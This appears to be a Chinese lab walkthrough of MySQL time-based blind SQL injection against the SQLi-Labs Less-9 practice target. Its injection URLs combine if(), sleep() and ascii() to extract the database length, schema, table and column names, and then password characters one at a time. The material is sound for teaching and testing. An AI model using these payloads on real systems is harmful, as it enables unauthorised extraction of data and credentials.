### 简介

**慎用 sleep**

继上一篇SQL报错型盲注之后，本篇介绍一下MySQL的时间盲注。\[附验证脚本\]

  

### 函数说明

*   if(1,2,3)：如果1真，则执行2，否则执行3
    
*   sleep(x)：执行延迟x秒
    
*   ascii(): 将字符串的第一个字符转换成ASCII码的形式
    
      
    

### 测试

SQLi-Labs level9

1.  **爆当前数据库长度**
    
      
    

```
http://127.0.0.1:10080/Less-9/?id=1' and if(length(database())>7, 1, sleep(3))\--+

```

  
![](../Images/c519a1b19d612ea14625916213c6dc43.png "01")

因为数据库名长度大于7，请求执行 if 条件为真，执行 1，所以请求正常返回，时间是2ms。

```
http://127.0.0.1:10080/Less-9/?id=1' and if(length(database())>8, 1, sleep(3))\--+

```

  
![](../Images/f6bd8848794c2faa0583d7e26513c70c.png "02")

因为数据库名长度大于8，请求执行 if 条件为假，执行 sleep(3)，所以请求延时，时间是3001ms。所以数据库名长度不大于8个字符。

  

通过两条语句判断当前数据库名长度为8个字符。

  

  

2.  **爆数据库名**
    

```
http://127.0.0.1:10080/Less-9/?id=1' and if(ascii(substr((select schema\_name from information\_schema.schemata limit 0,1), 1, 1))=105, sleep(2),1)\--+

```

  
![](../Images/6fc2abf9b02ff5dba5ef81e1fcec1e48.png "03")

可以看到当 ascii=105时，执行了 sleep，可以判断第一个数据库名的第一个字符为 i，依次判断可得到完整数据库名。

  

3.  **爆表名**
    
      
    

```
http://127.0.0.1:10080/Less-9/?id=1' and if(ascii(substr((select table\_name from information\_schema.tables where table\_schema='security' limit 0,1),1,1))=101,sleep(2),1)\--+

```

  
![](../Images/69a757cb6508541317d49ff51062e373.png "04")

可以看到当 ascii=101时，执行了 sleep，可以判断 'security' 数据库的第一个表名的第一个字符为 e，依次判断可得到完整的表名。

  

4.  **爆列名**
    

```
http://127.0.0.1:10080/Less-9/?id=1' and if(ascii(substr((select column\_name from information\_schema.columns where table\_schema='security' and table\_name='users' limit 0,1),1,1))=105, sleep(2), 1)\--+

```

  
![](../Images/899be599e258af174b29bc7dcae22f82.png "05")

可以看到当 ascii=105时，执行了 sleep，可以判断 'security' 数据库的 ‘users’ 的第一列的第一个字符为 i，依次判断可得到完整的列名。

  

5.  **爆数据**
    
      
    

```
http://127.0.0.1:10080/Less-9/?id=1' and if(ascii(substr((select password from users limit 0,1),1,1))=68,sleep(3),1)\--+

```

  
![](../Images/529ec43568fcf0a0c0995bb26f74529c.png "06")

可以看到当 ascii=68时，执行了 sleep，可以判断 password 列第一项数据的第一个字符为 D，依次判断可得到完整的数据。
